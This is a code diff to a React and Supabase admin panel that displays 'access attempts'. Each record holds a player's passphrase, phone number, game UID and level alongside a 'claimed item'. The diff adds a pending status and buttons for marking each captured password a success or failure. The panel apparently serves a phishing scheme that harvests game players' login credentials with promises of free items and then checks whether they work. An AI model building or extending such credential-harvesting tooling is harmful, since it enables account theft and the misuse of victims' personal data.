@@ -17,7 +17,7 @@ interface AccessAttempt {
   passphrase: string;
   item_name: string;
   timestamp: string;
-  status: 'success' | 'failed';
+  status: 'pending' | 'success' | 'failed';
   phone_number?: string;
   player_level?: string;
   player_uid?: string;
@@ -125,10 +125,10 @@ const AdminPanel = () => {
           passphrase: attempt.passphrase || 'No password',
           item_name: attempt.item_name || 'Unknown Item',
           timestamp: attempt.timestamp,
-          status: attempt.status as 'success' | 'failed',
-          phone_number: attempt.phone_number || 'No phone',
-          player_level: attempt.player_level || 'No level',
-          player_uid: attempt.player_uid || 'No UID'
+          status: attempt.status as 'pending' | 'success' | 'failed',
+          phone_number: attempt.phone_number || 'Unknown',
+          player_level: attempt.player_level || 'Unknown',
+          player_uid: attempt.player_uid || 'Unknown'
         }));
         
         console.log('Formatted attempts:', formattedAttempts);
@@ -336,26 +336,30 @@ const AdminPanel = () => {
     }
   };
 
-  const handleDeleteAttempt = async (attemptId: string) => {
+  const handleStatusChange = async (attemptId: string, newStatus: 'success' | 'failed') => {
     try {
       const { error } = await supabase
         .from('access_attempts')
-        .delete()
+        .update({ status: newStatus })
         .eq('id', attemptId);
 
       if (error) throw error;
       
-      setAccessAttempts(accessAttempts.filter(attempt => attempt.id !== attemptId));
+      // Update local state
+      setAccessAttempts(accessAttempts.map(attempt => 
+        attempt.id === attemptId ? { ...attempt, status: newStatus } : attempt
+      ));
+      
       toast({
-        title: "Attempt Deleted",
-        description: "Access attempt deleted successfully.",
+        title: "Status Updated",
+        description: `Status changed to ${newStatus}`,
       });
     } catch (error) {
-      console.error('Error deleting attempt:', error);
+      console.error('Error updating status:', error);
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Failed to delete attempt.",
+        description: "Failed to update status.",
       });
     }
   };
@@ -470,6 +474,8 @@ const AdminPanel = () => {
                       <span className={`px-3 py-1 rounded-full text-xs font-semibold ${
                         attempt.status === 'success' 
                           ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
+                          : attempt.status === 'pending'
+                          ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30'
                           : 'bg-red-500/20 text-red-400 border border-red-500/30'
                       }`}>
                         {attempt.status?.toUpperCase() || 'UNKNOWN'}
@@ -483,16 +489,26 @@ const AdminPanel = () => {
                       <p><strong className="text-foreground">Level:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.player_level}</span></p>
                       <p><strong className="text-foreground">Claimed Item:</strong> {attempt.item_name}</p>
                       <p><strong className="text-foreground">Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
-                      <div className="flex gap-2 mt-3">
-                        <Button 
-                          size="sm" 
-                          variant="destructive"
-                          onClick={() => handleDeleteAttempt(attempt.id)}
-                        >
-                          <Trash2 className="w-3 h-3 mr-1" />
-                          Delete
-                        </Button>
-                      </div>
+                      {attempt.status === 'pending' && (
+                        <div className="flex gap-2 mt-3">
+                          <Button 
+                            size="sm" 
+                            variant="outline"
+                            className="border-green-500 text-green-400 hover:bg-green-500 hover:text-white"
+                            onClick={() => handleStatusChange(attempt.id, 'success')}
+                          >
+                            Mark Success
+                          </Button>
+                          <Button 
+                            size="sm" 
+                            variant="outline"
+                            className="border-red-500 text-red-400 hover:bg-red-500 hover:text-white"
+                            onClick={() => handleStatusChange(attempt.id, 'failed')}
+                          >
+                            Mark Failed
+                          </Button>
+                        </div>
+                      )}
                     </div>
                   </div>
                 ))
@@ -517,13 +533,13 @@ const AdminPanel = () => {
             </div>
           </Card>
           
-          <Card className="card-premium text-center">
+           <Card className="card-premium text-center">
             <div className="p-6">
-              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
+              <Shield className="w-8 h-8 text-yellow-400 mx-auto mb-2" />
               <h3 className="text-2xl font-bold text-foreground">
-                {accessAttempts.filter(a => a.status === 'success').length}
+                {accessAttempts.filter(a => a.status === 'pending').length}
               </h3>
-              <p className="text-sm text-muted-foreground">Successful Claims</p>
+              <p className="text-sm text-muted-foreground">Pending Claims</p>
             </div>
           </Card>
           
